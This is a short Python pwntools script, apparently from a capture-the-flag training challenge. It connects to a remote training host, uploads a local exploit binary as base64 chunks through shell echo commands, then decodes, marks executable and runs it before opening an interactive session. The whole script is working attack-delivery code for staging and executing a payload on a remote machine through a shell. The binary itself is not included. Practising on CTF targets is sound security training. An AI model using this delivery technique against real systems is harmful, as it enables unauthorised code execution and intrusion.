from pwn import *
from base64 import b64encode

# r = remote("localhost", 1337)
r = remote("training.theromanxpl0.it", 42056)

exp = open("./exp", "rb").read()
dump = b64encode(exp).decode("utf-8")

r.sendlineafter(b"$ ", b"rm -f exp.b64 && touch exp.b64")

cs = 100
for i in range(0, len(dump), cs):
    chunk = dump[i:i+cs]
    print(chunk)
    r.sendlineafter(b"$ ", f"echo -n '{chunk}' >> exp.b64".encode())

r.sendlineafter(b"$ ", b"base64 -d exp.b64 > exp")
r.sendlineafter(b"$ ", b"chmod +x exp")
r.sendlineafter(b"$ ", b"./exp")

r.interactive()
